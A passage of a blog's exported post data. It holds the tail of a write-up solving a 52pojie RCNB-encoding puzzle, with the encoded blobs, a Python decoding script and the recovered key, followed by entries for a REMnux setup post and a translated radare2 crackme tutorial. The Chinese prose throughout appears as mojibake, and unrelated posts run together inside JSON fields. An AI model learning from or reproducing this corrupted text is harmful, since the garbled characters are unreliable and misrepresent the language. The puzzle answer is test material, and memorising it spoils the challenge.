BÅ™Ä‰Å…ÆƒÅ†ÆƒÅ˜ÆˆÉŒÃ‡Ã‘ÃÅ‡Æ„È“Ä‰ÉÄ‹ÅˆÆ…Å„Ã¾Å—CÅ™ÄŒÆÆ„RCÅ†ÃÆÆÅ”ÄˆRÈ¼NÆ…È’CnÆƒÉŒÆ‡Ç¹ÃŸÅ„ÃÅ•ÆˆÅ‡BÅ˜CÅ•È¼Ã‘BÈ’Ã‡ÅƒÃÇ¸ÆÈ“È¼Å•ÄŒÈ Ã¾ÈµÆÈ‘ÆˆÅ„Æ€Å”cÈ‘Æ‡Ã‘ÃŸrÆˆÇ¸ÃrcÅƒÃÅ‡Æ…È“Ä‡ÉŒÄ‡Å„Æ€ÉÄ‡ÅˆÆ€È Æ…Å˜È¼Ç¸ÆÉÄŠÅ™ÄÆÃÅ†ÆƒrÄŠÇ¸Æ€Å—cÈ“ÆˆÅ„Æ€Å‡Æ€ÈcrÄŠÅ…BÈ“ÄˆÈ ÆÉÄ‡nÆnÃÉŒÆ‡Ã‘ÆƒÈÈ¼ÆÃŸÅ”CÉÄ‡ÆbÆBÈ’cÅ†ÆrÄ‹nBÅ—ÆˆÈ“È»Å„ÆƒÉŒCÃ‘BÆÆ€È’ÄŒÅˆÃŸÅ”Æ‡Å™Æ‡Ç¹bÅ–cÅ†ÆƒÅ•Ä†ÅˆÃ¾Å•ÄŒÅ†Æ…È’Ä‰Å‡Æ…ÈÄˆÅ‡ÆÈ ÆƒRÄ‰Å”Æ‡Ç¸Ã¾Å˜ÄŠÈµÃŸÅ”È¼Å„bÈ‘ÆˆÈ BÇ¹BÉŒÄÈµÆƒrÄÇ¹Æ„Å”È»ÆÆ…Å—È¼È’Ä†ÆÆ€Å–Ä‰ÈµbÅ•cÆÃÈ’È¼Å„BrÄ‹Ç¸Æ…Å˜cÈ ÃÈÄÆbÈ“ÄŠÅ…bÅ˜CÈ Æ€ÉÄ†È Æ…Å•Ä‰NÆ€È ÃÅ–Ä‡Å™Ä‹Å„ÆÅ„Ã¾È“Ä‰È ÆÆ¦È»nÆ€È“Ã‡ÉÄˆÅ…Æ…Ç¸Æ€È“ÄÈ’È»Å†Æ€Ç¹ÃÉcÈ‘Ä†ÈµÆƒrÈ»ÆÆ€ÉŒCÅƒÃ¾ÉÄˆÈµÃ¾Å–ÄŒÅ†ÃŸÅˆÆ…Å—Ä‰Ã‘ÃÅ•ÆˆÈ‘cÅƒÆÇ¸ÃŸÈ’Æ‡ÈÃ‡ÆÃŸÅ„bÅ•ÆˆÈµBÅ•Æ‡nÆ„È“Ä‹È‘È¼È BÉÄ‹Å…ÃÅ—Ä‹Å…ÆƒÆ¦ÄÅ„Æ„ÅˆÃRÃ‡rcÅ…Æ„ÈÃ‡È ÃÅ™ÄÈ ÃÆBÉŒÈ¼ÉÄˆÅ‡Ã¾ÉÄ‰Ã‘Æ…Ç¸BrÄ†ÅˆÆƒÅ–È»Å•ÄÈµbÅ†ÃŸÅ˜ÄŠÆÆ€ÈÆˆnÃ¾Å˜ÄÈ“È»Ã‘ÃÅ•cÅ„Ã¾Å†bÅ”È¼ÉŒÄŒÃ‘BÉŒÄÈµbÈ‘ÄˆÅ…BÅ•Ä‰ÆÆ„Ã‘Ã¾È’Ã‡È“È»NÆ€Ã‘ÃŸÅ˜ÄˆÃ‘Æ€ÈÈ¼ÆBÅ”ÄˆÈµÃ¾ÉÄŠÃ‘ÃŸÅ•Ä‰È’È¼nÃ¾Å•Ã‡Å†bÅ„Ã¾ÉÄ†Å…ÃÅ—ÄŠÅƒÆƒRÄ‹Å†Æ…Å˜cNÃ¾È‘Ä†Å…ÆrÆˆÇ¸Æ„È’CÆÃ¾Å–È»rÃ‡Å‡bÅ™ÄŠÅ…Æ…È‘ÆˆÅƒBÆ¦Ä‹nÃŸÅˆÆ…Æ¦Ä‰Ã‘Ã¾È“ÄˆÅ™È¼ÅƒÆ€ÉcÅƒÆ„ÈµÃ¾ÉŒCÅ™Ä†NÆ„Ç¹Æ„Æ¦È»Å”ÄÅ…ÆƒnÆ…rÄ‹rCÇ¸Æ„È“ÆˆÅƒÆ€rÃ‡nÆrCÃ‘Æ…rCÈµÆ€rÆˆÇ¹ÃŸrÆˆÈµÆRÄ†ÆÆrÃ‡Å‡ÃÈµÃŸÆ¦ÄŒÈ‘È¼Ç¸ÆÇ¹BÈ‘cÉŒÆˆÆÃÈ’Ä†Å…ÃrÄ†ÅˆÆƒRÄ‡Å‡ÆÈ Æ…È“crc'); 1234567891011#!/usr/bin/env pythonf = open('plain_array.txt', 'rb')t = f.read()f.close()data = t.split('\\n')[:-1]print len(data)# print dataf = open('trial.7z', 'wb')for i in range(len(data)): f.write(chr(int(data[i])))f.close() è§£å‹åæ‹¿åˆ°ä¸€ä¸ªæ–°æ–‡ä»¶nbï¼Œè¿˜æ˜¯è¢«åŠ å¯†äº†çš„ï¼š 1ÈÈ¼ÅƒÆÈ“Ä‰nÆ…Å•Æ‡Å…Æ€È“Æ‡ÅƒÆ…È’Ä‹ÆÃ¾Å•Æ‡NÆ„ÉŒÄ‡ÅƒÃÉŒCÈµBÈ’ÄŒNÆ„ÉŒCÅˆÆ€ÉŒÄ‡Ã‘bÈ’CÅ…ÃÅ•Æ‡Å‡ÆÈ“Æ‡Å„ÆÅ•Æ‡Å…Æ…È’CÅ†bÈ’Ä‹ÆÃÈ’ÆˆÆÆ€È’ÄŒnÆÉŒÄ‡ÅƒÃÈ“ÆˆÈ Æ…È“Æ‡NÃ¾ÉŒcÅ„BÈ“ÄŠÇ¸ÆÈ’È¼ÈµbÈ’ÆˆnbÉŒCÈµÃŸÈ’È¼È ÃÈ“Ä‰NÆÅ—Ä‡ÆÆ…RÄ‡Å‡bÆÆ…RÈ»Ã‘ÃŸÅ˜È»Å‡ÆrÄŠÅ„ÃŸÅ•ÄÈ Ã¾RÄ‰NÆÆ¦ÄˆÅ†BÆ¦cÇ¹ÃÆ¦Ä‡ÅƒbÆ¦ÄˆNÆÆ¦ÄˆÈ’Ä‡ÆÃnÆ…Å”Ä†Å†ÃrÈ¼È’Ä‡ÆÃ¾Ç¸ÃŸRÄŠÅ„Ã¾rÈ»NÃ¾rÄŒÅ„ÃŸÅ•ÄÇ¸ÃRÄŠÈµÃrÈ¼ÈµbÅ•Æ‡Å‡ÃrÄŠnÃÅ”Ä†nBÅ˜Ã‡ÆÆƒrÄ‰Ç¹Ã¾Æ¦Ä‡Å†Æ…Æ¦cÈµÆ€Æ¦Ä‡Å†BÆ¦cÇ¹ÃÆ¦Ä‡ÅƒbÆ¦ÄˆNÆÆ¦ÄˆÈ’Ä‡ÆÃnÆƒÅ”Ä†Ç¸Ã¾RÄŠÆÆƒrÄ‰ÅˆÃÆ¦Ä‰Å™Æ‡ÆÃ¾ÈµÆ…rÈ¼Å†brCnÆƒÅ”Ä†Å†ÃŸRÄ‡Å„ÃŸrÈ»Å„ÃŸÅ•ÄÅƒBRÄŠÆÆ…Å™È»ÆÆ€Å™Æ‡Ç¹Ã¾Æ¦Ä‡ÈµÃÅ™ÆˆÆÃ¾Å™È»Å…Ã¾Æ¦cÇ¸ÆÅ™È»Å†Æ„Æ¦cÆÃÅ™È»Å‡bÅ™Æ‡Ç¹ÃÆ¦Ä‡NÃ¾Æ¦ÄˆÆÆ„Å™È»Å†Æ€Æ¦cÇ¸ÆÅ™È»Å†Æ„Æ¦cÆÃŸÅ™È»Å†ÆÆ¦cÇ¹Ã¾Æ¦Ä‡Å†Æ„Æ¦cÆÆ„Å™È»Å†BÆ¦cÇ¹ÃÆ¦Ä‡ÅƒbÆ¦ÄˆÈµÆ€Æ¦Ä‡È’Ä‡ÆÃÅƒÆ„Å”CÆÃÅ™È»Å…Ã¾Æ¦cÅˆÃÆ¦Ä‰Å™Æ‡ÆÃ¾ÈµÆ…rÈ¼Å†brCÅƒÆ„Å”CÆÃŸÅ™È»Å…ÃÆ¦cÇ¹ÃÆ¦Ä‡ÈµÆ„Å™ÆˆÈµÆ€Æ¦Ä‡Å…ÃÆ¦cÅˆÃÆ¦Ä‰ÈµÆÅ™ÆˆÅ…ÃŸÅ™Æ‡È’Ä‡ÆÃ¾ÅƒBRÄŠÆÃŸÅ™È»Å†Æ€Æ¦cÅˆÃÆ¦Ä‰ÈµÆ„Å™ÆˆÆÃÅ™È»Å†Æ€Æ¦cÇ¹ÃÆ¦Ä‡NÃ¾Æ¦ÄˆÆÆ…Å™È»Å†Æ€Æ¦cÅˆÃÆ¦Ä‰ÈµÆ„Å™ÆˆÆÃ¾Å™È»Å‡bÅ™Æ‡Ç¸ÆÅ™È»Å†Æ„Æ¦cÆÃÅ™È»Å‡bÅ™Æ‡Ç¹ÃÆ¦Ä‡NÃ¾Æ¦ÄˆÆÆ„Å™È»Å†Æ€Æ¦cÇ¸ÆÅ™È»Å†Æ„Æ¦cÆÆ„Å™È»È’Ä‡ÆÃnÆƒÅ”Ä†Ç¸Ã¾RÄŠÅ‡Æ…rÄŠÅƒBrÄŒÅƒÆƒÅ”Ä‹Å„Ã¾rÈ»Å…brÄ‹Ç¹ÃÆ¦Ä‡ÈµÃÅ™ÆˆÈ“ÄnÃnÆ…rÄ‡Ç¸ÆƒÅ”Ä‡Ã‘Ã¾Å˜È»È BÅ˜ÄŠÈµÆ…Å•Ä‹RÄ‡Å†ÃŸÆÆƒÅ”Æ‡ÈµÆ…rÆ‡Å…ÃÆ¦cÇ¹ÃÆ¦Ä‡ÈµÆÅ™ÆˆÈ“ÄnÆ„NÃ¾Å™Ä†ÅƒÆƒÅ”Ä‹Ã‘Æ€rÃ‡ÆÆ€Å™Æ‡Ç¹Ã¾Æ¦Ä‡Å†Æ„Æ¦cÆÆ…Å™È»Å†ÆÆ¦cÅˆÃÆ¦Ä‰Å†Æ„Æ¦cÅˆÃŸÆ¦cÅ†Æ€Æ¦cÇ¸ÃŸÅ™È»ÈµÆƒÅ™ÆˆÅˆÃŸÆ¦cÅ‡BÅ™Æ‡Ç¸Æ„Å™È»Å†Æ„Æ¦cÈµÆ€Æ¦Ä‡È’Ä‡ÆÃÇ¸bÅ”Ä‡ÅˆÃRÄŒNÆ…Å˜CÇ¹ÃÆ¦Ä‡ÅƒbÆ¦ÄˆÅˆÃÆ¦cÆÆ€Å™Æ‡Ç¸Æ„Å™È»È’Ä‰Å…BÇ¹ÃrÄÈ brÄÅ…ÃÅ”cÃ‘ÆƒRCÈµbÅ•Æ‡nÆ…rÄ‡ÅƒÆ„Å”CÆÃŸÅ™È»Å…ÃÆ¦cÅˆÃÆ¦Ä‰ÈµÆÅ™ÆˆÆÆ„Å™È»Å‡bÅ™Æ‡ÅˆÃÆ¦Ä‰ÈµÆÅ™ÆˆÅ…ÃŸÅ™Æ‡Å‡BÅ™Æ‡Ç¸ÆÅ™È»Å†Æ„Æ¦cÆÃŸÅ™È»ÆÆ€Å™Æ‡Ç¹Ã¾Æ¦Ä‡ÈµÃÅ™ÆˆÃ‘bÅ™È»Å™ÄŒÈµÃŸÇ¸ÃRÄŠÇ¸Ã¾RÄŠÇ¹ÃrÄÈ brÄÇ¸bÅ”Ä‡Å†Ã¾RÄ‡È ÆƒÅ˜ÄŠÅƒÆ„rÄŒÅƒBRÄŠÆÆ…Å™È»Å†Æ€Æ¦cÇ¸ÆÅ™È»Å†Æ„Æ¦cÆÆ…Å™È»ÆÆ€Å™Æ‡Ç¹ÃÆ¦Ä‡ÈµÆ€Å™ÆˆNÆÆ¦ÄˆÆÆ€Å™Æ‡ÅˆÃÆ¦Ä‰ÈµÆ„Å™ÆˆÆÃ¾Å™È»Å‡bÅ™Æ‡Ç¸ÆÅ™È»Å†Æ„Æ¦cÆÆ„Å™È»Å†BÆ¦cÇ¸ÃŸÅ™È»ÈµÃ¾Å™ÆˆÈµÆ€Æ¦Ä‡È’Ä‡ÆÆ„ÈµÆ…Å”È»NÆ…RÄ‰Ç¸Æ…Å˜CÅ†brCÈ BÅ”Ä†Å…ÃŸÅ™Æ‡Å™ÄŒÈµÆÈµÆ…Å”È»Å„Ã¾rÈ»ÆÆƒrÄ‰Ç¸ÆƒÅ™È»ÈµÃÅ™ÆˆNÆÆ¦ÄˆÅ†BÆ¦cÅˆÃÆ¦Ä‰ÈµÆÅ™ÆˆÅ‡bÆ¦Ä†Å…ÃÆ¦cÇ¹Ã¾Æ¦Ä‡Å†Æ…Æ¦cÈµÆ€Æ¦Ä‡Å‡BÅ™Æ‡Ç¸Æ…Å™È»ÈµÃ¾Å™ÆˆÆÃŸÅ™È»Å†Æ€Æ¦cÇ¸Æ„Å™È»ÈµÆ„Å™ÆˆÈµÆ€Æ¦Ä‡Å†Æ€Æ¦cÇ¹ÃÆ¦Ä‡ÅƒbÆ¦ÄˆNÆÆ¦ÄˆÅ†ÆÆ¦cÇ¹ÃÆ¦Ä‡NÃ¾Æ¦ÄˆÆÃŸÅ™È»Å™ÄŒÈµÆ…nÆƒÅ”Ä†ÆÆƒrÆˆÇ¹Æ€Å•Ä‰Å‡ÃrÄŠnÆƒÅ”Ä†ÈµÆrÈ¼Å†bÅ”cÅƒÆƒrÄŒÇ¸bÅ”Ä‡Å†ÃŸRÄ‡Ã‘Æ€rÆ‡Ç¸ÃŸÅ™È»Å†Æ„Æ¦cÆ¦È¼Å‡Æ…nÃŸrÄ‡Ç¹bRÄŠÅ…brÈ»Ç¹ÃÅ•ÄŠÅˆÃÆ¦Ä‰Å™Æ‡Ã‘bÇ¸Ã¾Å•Ä‰Å„Æ…Å•ÄÆÆ€RÈ»Ã‘BRCÆBrÆˆÅƒbÅ™Ä†ÅƒÃÅ–ÄŠnÆ€Å˜Ã‡Ç¹Æ€Å•Ä‰Å‡Æ„rÄŠÆÆƒÅ”Æ‡ÈµÆ„rÈ¼ÅƒÆ€rÄŒÅ†BrCÈ Ã¾RÄ‰ÅˆÃŸÆ¦cÅ™Ä‹Ã‘Æ…RÄ†Å‡Ã¾Å–Æ‡ÅƒÃÇ¹Æ…Æ¦Ä‡È’Ä‰Å…BÈµÆrÈ¼ÅˆÃŸÅ•Ä‹È ÃŸÅ”ÄÆÃŸÅ™È»Å†ÆÆ¦cÇ¹ÃÆ¦Ä‡Å™Æ‡ÆÃ¾Ç¹ÃrÄÅ†brCnÆƒÅ”Ä†Ã‘ÆƒRCÈµbÅ•Æ‡Å†brCnÃÅ”Ä†nBÅ˜Ã‡Å‡Æ…rÄŠÅƒÆ„rÄŒÅƒBRÄŠÆÆ…Å™È»Å†Æ€Æ¦cÇ¸ÆƒÅ™È»ÈµÃŸÅ™ÆˆÆÃŸÅ™È»ÆÆ€Å™Æ‡Ç¸ÆÅ™È»Å†Æ„Æ¦cÆÃÅ™È»Å‡bÅ™Æ‡Ç¹ÃÆ¦Ä‡NÃ¾Æ¦ÄˆÆÆ„Å™È»Å†Æ€Æ¦cÇ¸ÆÅ™È»Å†Æ„Æ¦cÆÃŸÅ™È»ÆÆ€Å™Æ‡Ç¹ÃÆ¦Ä‡ÈµÃÅ™ÆˆÆÆ„Å™È»Å‡BÅ™Æ‡Ç¸Æ…Å™È»ÈµÃ¾Å™ÆˆÆÆ…Å™È»È’Ä‡ÆÆ…ÅƒÃÅ–ÄŠnBÅ˜Ã‡Å…brÈ»È BrÄÇ¸ÃRÄŠÇ¸ÃŸRÄŠÅ…ÃŸÅ”cÅƒÆÅ™Ä†Ç¹bRÄŠÈµÃŸrÈ¼ÆbÅ˜ÄŒÅ‡Ã¾rÄŠÇ¸ÃRÄŠÃ‘BRCÇ¹Æ„rÄÅ„Æ…Å•ÄÅƒÆ„Å”CÆÃŸÅ™È»Å†ÆÆ¦cÇ¹ÃÆ¦Ä‡ÈµÃÅ™ÆˆÈ“ÄŒÅƒÆ…ÆÆ…Æ¦cNÃ¾Æ¦ÄˆÅˆÃŸÆ¦cÅ†BÆ¦cÇ¹ÃŸÆ¦Ä‡Å„ÃŸÅ™Æ‡ÅˆÃŸÆ¦cÅ†Æ€Æ¦cÇ¸Æ…Å™È»Å™ÄÈ bÅ…Ã¾Æ¦cÇ¹Æ…Æ¦Ä‡ÈµÆ„Å™ÆˆÆÃÅ™È»ÆÆ€Å™Æ‡ ç„¶åä¸€å±‚å±‚è§£å¯†æ‹¿åˆ°keyï¼š 1234567Well done! It seems that you have great programming skills.ÈÈ¼ÅƒÃŸÉŒCÈµÆƒÈ’È¼ÈµbÈ’ÆˆnbÉŒÃ‡Å„ÃŸÉŒÄˆÈ ÆƒÈ’È»ÅƒBÈ“ÆˆÈ ÆƒÈ’È¼ÈµbÈ’ÄŒÅƒBÉŒCÅˆÆ€È’ÄŠÅ‡ÃŸÉŒcÅ„Ã¾È“ÄŒÅ‡ÆÅ•Æ‡Å†ÃÈ’È»ÅƒÆ„Å•Æ‡Å…Æ…È“Æ‡ÅƒÆƒÈ’È¼È bÈ’CÅ†ÆÉŒCÅˆÆ€È’CÅ…Æ€È’Ä‰È Æ€ÉŒÄ‡Ã‘bÉŒcÅ…Æ„ÉŒÄ‰Å†Æ„È’È»Å„Æ„ÉŒÄ‰Å‡ÃÅ•Æ‡Å†ÃÈ’È»ÅƒÆ„Å•Æ‡ÅƒbÈ’ÄŒÅƒÆ„Å•Æ‡Å„BÈ’ÄŒnÆÈ“È¼Ç¸ÃŸÅ—Ä†nÆ€È’Ä‡nÃ¾Å•Æ‡nÃ¾È“Æ‡Å„Æ…ÉŒÆ‡ÆÆ„Å™ÄˆÆÃŸÅ—Æ‡È bÈ“ÄÈµbÈ’È¼ÆÃ¾Å—cÅ…Æ…È‘Ä‰È ÆÈ’CÅ…Æ€ÉŒÄ‡ÅƒÃÉŒÄ‡Ã‘ÃŸÅ•Æ‡Å…Ã¾È“ÄŒÅˆBÉŒÄŒÅ…Æ…È“ÄŠÇ¸Æ„ÉŒcÅ„Æ„Å•Æ‡Å„Ã¾È’Ä†ÈµÃ¾ÉŒÄ‰Å‡ÃÅ•Æ‡ÅƒÆƒÅ™ÄÈ bÅ™Ä‹ÈµÆ€È“CÃ‘BÅ™Ä‡ÅƒBÅ–ÄŒÈµÆƒÉŒÄ‡Ç¸Æ€È“ÆˆÈ ÃŸÅ˜ÄÅ…Æ„Å—Ä‰È Æ„È’È¼ÈµÆ…È’È»Å…BÈ’Ä†ÆÆƒÈ’ÄˆÃ‘Æ„È“ÄŠÅ†BÅ™Æ‡NÆÉŒÆ‡ÆbÉŒCÆÃŸÈÄ‰Å†Ã¾Æ¦È»ÆÆƒÅ—ÄˆÅ„Æ€ÉŒCÆB;) ÈcÅˆÃÅ—cÅ…Æ…È’CÅ…Æ€È’Ä‰È Æ€È’È»ÅƒÆ„ÉŒcÅ„Æ„Å–Ä‹Å…Ã¾Å•Æ‡Å†ÃÈ’È»ÅƒÆ„Å•Æ‡Å…Ã¾È’ÄŒÅƒÃŸÅ˜ÄÅ„bÆ¦È»Å‡Æ…ÉŒÄŒÃ‘Ã¾ÉŒÆˆÇ¹ÆƒÉŒÄ‰Å…ÃŸÈ’CÅ…Æ…È’ÄŒnBÆ¦È»ÆÆƒÈ‘Ã‡ÆÆ„Å˜CNÆÈÄ‰Å†Ã¾ 1234567Well done! It seems that you have great programming skills.Wishing you happiness during the holidays and throughout the New Year!- by Coxxs@52PoJiE, [Want to know more about RCNB.js?](https://github.com/Coxxs/RCNB.js);) Oh, and here&apos;s the key: N0w_y0u_are_NB_A5_RC æ„Ÿè°¢çš„è¯æœ€åæ„Ÿè°¢å¾çˆ±ç ´è§£å¤§ä½¬ä»¬çš„è¾›å‹¤ä»˜å‡ºï¼ å‚è€ƒç½‘ç«™https://github.com/Coxxs/RCNB.jshttps://travis-ci.com/Coxxs/RCNB.jshttps://liudanking.com/golang/utf-8_replacement_character/https://www.52pojie.cn/thread-873265-1-1.html","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://qianfei11.github.io/tags/wp/"},{"name":"re","slug":"re","permalink":"https://qianfei11.github.io/tags/re/"}]},{"title":"Installing Minimal Ubuntu for REMnux","slug":"Installing-Minimal-Ubuntu-for-REMnux","date":"2019-02-20T14:10:38.000Z","updated":"2019-02-20T14:21:28.790Z","comments":true,"path":"2019/02/20/Installing-Minimal-Ubuntu-for-REMnux/","link":"","permalink":"https://qianfei11.github.io/2019/02/20/Installing-Minimal-Ubuntu-for-REMnux/","excerpt":"å› ä¸ºgoogle driveä¸Šä¸‹è½½REMnuxçš„ovaå®åœ¨æ˜¯å¤ªæ…¢äº†ï¼Œåœ¨å®˜æ–¹æ–‡æ¡£ä¸Šçœ‹åˆ°äº†å¯ä»¥ç”¨ubuntuæ¥å¼„ã€‚è¿™é‡Œè®°å½•ä¸€ä¸‹å®‰è£…Ubuntu 14.04 64-bit minimal ISOçš„è¿‡ç¨‹ã€‚æ¬è¿è‡ªè¿™é‡Œã€‚","text":"å› ä¸ºgoogle driveä¸Šä¸‹è½½REMnuxçš„ovaå®åœ¨æ˜¯å¤ªæ…¢äº†ï¼Œåœ¨å®˜æ–¹æ–‡æ¡£ä¸Šçœ‹åˆ°äº†å¯ä»¥ç”¨ubuntuæ¥å¼„ã€‚è¿™é‡Œè®°å½•ä¸€ä¸‹å®‰è£…Ubuntu 14.04 64-bit minimal ISOçš„è¿‡ç¨‹ã€‚æ¬è¿è‡ªè¿™é‡Œã€‚","categories":[],"tags":[{"name":"translation","slug":"translation","permalink":"https://qianfei11.github.io/tags/translation/"}]},{"title":"Radare2ä¹‹æ—…-Part1ï¼šSimple crackme","slug":"Radare2ä¹‹æ—…-Part1ï¼šSimple crackme","date":"2019-02-18T04:17:27.000Z","updated":"2019-02-24T13:20:19.291Z","comments":true,"path":"2019/02/18/Radare2ä¹‹æ—…-Part1ï¼šSimple crackme/","link":"","permalink":"https://qianfei11.github.io/2019/02/18/Radare2ä¹‹æ—…-Part1ï¼šSimple crackme/","excerpt":"ç¿»è¯‘è‡ªMegabeetsã€‚","text":"ç¿»è¯‘è‡ªMegabeetsã€‚ åºè¨€è¿‡å»ä¸€å¹´é‡Œçš„CTFæ¯”èµ›ä¸­ï¼Œä¸è®ºæ˜¯é€†å‘å·¥ç¨‹ï¼ˆREï¼‰è¿˜æ˜¯æ¼æ´æŒ–æ˜ï¼ˆPWNï¼‰ï¼Œæˆ‘ä¸€ç›´åœ¨ç”¨radare2ã€‚æˆ‘å‘ç°radare2å¯¹äºå¾ˆå¤šCTFçš„é¢˜ç›®æ¥è¯´éƒ½å¾ˆæœ‰ç”¨ï¼Œæå¤§åœ°ç¼©çŸ­äº†æˆ‘çš„åšé¢˜æ—¶é—´ã€‚é—æ†¾çš„æ˜¯ç†Ÿæ‚‰radare2çš„äººå¤ªå°‘äº†ã€‚å¯èƒ½å¤§å®¶éƒ½ä¹ æƒ¯äº†ä½¿ç”¨IDA Proã€OllyDBGè¿˜æœ‰gdbï¼Œæˆ–è€…æ²¡æœ‰å¬è¯´è¿‡å®ƒã€‚ä¸ç®¡æ€ä¹ˆæ ·ï¼Œæˆ‘éƒ½è®¤ä¸ºradare2åº”è¯¥æˆä¸ºä½ å·¥å…·ç®±ä¸­çš„ä¸€éƒ¨åˆ†ã€‚ å› ä¸ºæˆ‘çœŸçš„ç‰¹åˆ«å–œæ¬¢è¿™ä¸ªé¡¹ç›®ï¼Œè€Œä¸”æˆ‘å¸Œæœ›èƒ½æœ‰è¶Šæ¥è¶Šå¤šçš„äººå¼€å§‹ç†Ÿæ‚‰å®ƒã€ä½¿ç”¨å®ƒï¼Œèƒ½å¯¹é¡¹ç›®åšå‡ºä¸€äº›è´¡çŒ®ã€‚æˆ‘è®¡åˆ’å†™ä¸€ç³»åˆ—çš„æ–‡ç« ä»¥åŠä½¿ç”¨r2çš„ä¾‹å­ã€‚å› ä¸ºé‚£äº›æ–‡ç« éƒ½æ¶‰åŠradare2çš„ç‰¹ç‚¹å’ŒåŠŸèƒ½ï¼Œæˆ‘ä¼šè§£é‡Šçš„æ›´åŠ è¯¦ç»†ã€‚ radare2radare2æ˜¯ä¸€ä¸ªé€†å‘å·¥ç¨‹å’ŒäºŒè¿›åˆ¶åˆ†æçš„å¼€æºæ¡†æ¶ï¼Œå®ƒæœ‰å¾ˆå¤šå‘½ä»¤è¡Œæ¥å£ï¼ŒåŒ…æ‹¬åæ±‡ç¼–ã€åˆ†ææ•°æ®ã€æ‰“è¡¥ä¸ã€æ¯”è¾ƒæ•°æ®ã€æŸ¥æ‰¾ã€æ›¿æ¢ã€å¯è§†åŒ–ç­‰ç­‰åŠŸèƒ½ã€‚åŒæ—¶å®ƒå¯ä»¥åœ¨å‡ ä¹æ‰€æœ‰çš„ä¸»è¦æ“ä½œç³»ç»Ÿï¼ˆGNU/Linuxã€.Windowsã€*BSDã€iOSã€OSXã€Solarisç­‰ç­‰ï¼‰ä¸Šè¿è¡Œï¼Œå¹¶ä¸”æ”¯æŒè®¸å¤šCPUæ¶æ„å’Œæ–‡ä»¶æ ¼å¼ã€‚ä»–æ‰€æœ‰çš„ç‰¹ç‚¹å¯ä»¥å±•ç°å‡ºä¸€ä¸ªæ€æƒ³â€”â€”radare2æ˜¯ç»å¯¹è‡ªç”±çš„ã€‚ è¯¥æ¡†æ¶æ˜¯ä¸€ä¸ªå·¥å…·çš„é›†åˆï¼Œæ—¢å¯ä»¥åœ¨r2ç»™å‡ºçš„shellä¸‹ä½¿ç”¨ï¼Œåˆå¯ä»¥ç‹¬ç«‹ä½¿ç”¨â€”â€”æ¯”å¦‚æˆ‘ä»¬å°†è¦äº†è§£çš„rahash2ã€rabin2ã€ragg2ä¸‰ä¸ªç»„ä»¶ã€‚æ‰€æœ‰çš„ç»„ä»¶èµ‹äºˆäº†radare2å¼ºå¤§çš„é™æ€æˆ–åŠ¨æ€åˆ†æã€åå…­è¿›åˆ¶ç¼–è¾‘ä»¥åŠæ¼æ´æŒ–æ˜èƒ½åŠ›ï¼ˆåœ¨æ¥ä¸‹æ¥çš„æ–‡ç« ä¸­æˆ‘ä¼šæ›´æ·±å…¥åœ°è®²è¿°ï¼‰ã€‚ æˆ‘ä»¬å¿…é¡»æ„è¯†åˆ°å­¦ä¹ r2æ˜¯ä¸€ä¸ªååˆ†è‰°éš¾çš„è¿‡ç¨‹â€”â€”è™½ç„¶r2æœ‰GUIå’ŒWebUIã€‚åœ¨æˆ‘çœ‹æ¥ï¼ŒIDAçš„GUIå’Œæ–¹ä¾¿æ€§ç¡®å®æ›´ä½³ã€‚ä½†æ˜¯å®ƒçš„å‘½ä»¤è¡Œæ¥å£ï¼ŒåŒ…æ‹¬å…¶å¯è§†åŒ–æ¨¡å¼ï¼Œä»ç„¶æ˜¯radare2çš„æ ¸å¿ƒä»¥åŠé­…åŠ›æ‰€åœ¨ã€‚å› ä¸ºå®ƒçš„å¤æ‚æ€§ï¼Œæˆ‘ä¼šå°½åŠ›è®²å¾—æµ…æ˜¾æ˜“æ‡‚ã€‚ åœ¨å¼€å§‹ä¹‹å‰ï¼Œä½ å¯ä»¥çœ‹ä¸€çœ‹â€œr2ã€IDA Proå’ŒHopperç­‰å·¥å…·é—´çš„æ¯”è¾ƒâ€æ¥äº†è§£å®ƒã€‚ è·å–radare2ä¸‹è½½radare2çš„ç¯å¢ƒé…ç½®éå¸¸å¿«â€”â€”æˆ‘ä»¬æ¯å¤©éƒ½ä¼šæ›´æ–°ï¼Œæ‰€ä»¥æ›´æ¨èä½ å»ä½¿ç”¨gitçš„ç‰ˆæœ¬ï¼Œè€Œä¸æ˜¯ç¨³å®šç‰ˆæœ¬ã€‚æœ‰æ—¶å€™ç¨³å®šç‰ˆæœ¬å¯èƒ½æ²¡æœ‰gitç‰ˆæœ¬æ›´ç¨³å®šã€‚ 123$ git clone https://github.com/radare/radare2.git$ cd radare2$ ./sys/install.sh å¦‚æœä½ ä¸æƒ³ä¸‹è½½gitç‰ˆæœ¬æˆ–è€…ä½ æƒ³è¦ä¸åŒæ“ä½œç³»ç»Ÿï¼ˆWindowsã€OS Xã€iOSç­‰ç­‰ï¼‰ä¸Šçš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¯ä»¥åœ¨radare2å®˜ç½‘ä¸‹è½½ç•Œé¢æŸ¥çœ‹ã€‚ æ›´æ–°æ­£å¦‚æˆ‘ä¹‹å‰æ‰€è¯´çš„ï¼Œæ›´æ¨èå¤§å®¶ä½¿ç”¨gitä»“åº“é‡Œæœ€æ–°ç‰ˆçš„r2ã€‚ä»gitæ›´æ–°r2åªéœ€è¦æ‰§è¡Œï¼š 1$ ./sys/install.sh ç„¶åä½ å°±èƒ½ä»gitè·å¾—æœ€æ–°çš„ç‰ˆæœ¬ã€‚æˆ‘é€šå¸¸æ¯å¤©æ—©ä¸Šä¼šæ›´æ–°ä¸€ä¸‹radare2ï¼Œåœ¨è¿™æœŸé—´å¯ä»¥çœ‹çœ‹ä¸€ä¼šå„¿è§†é¢‘æ¶ˆé£ã€‚ å¸è½½æˆ‘å®åœ¨æƒ³ä¸å‡ºä»€ä¹ˆç†ç”±ä¼šè®©ä½ åœ¨çœ‹è¿™ç¯‡æ–‡ç« æ—¶æƒ³è¦å¸è½½radare2ã€‚å¦‚æœè¦å¸è½½çš„è¯åªéœ€è¦æ‰§è¡Œï¼š 12$ make uninstall$ make purge å¼€å§‹å­¦ä¹ ä½ å¯ä»¥åœ¨è¿™é‡Œä¸‹è½½Crackmeã€‚ ç°åœ¨ä½ 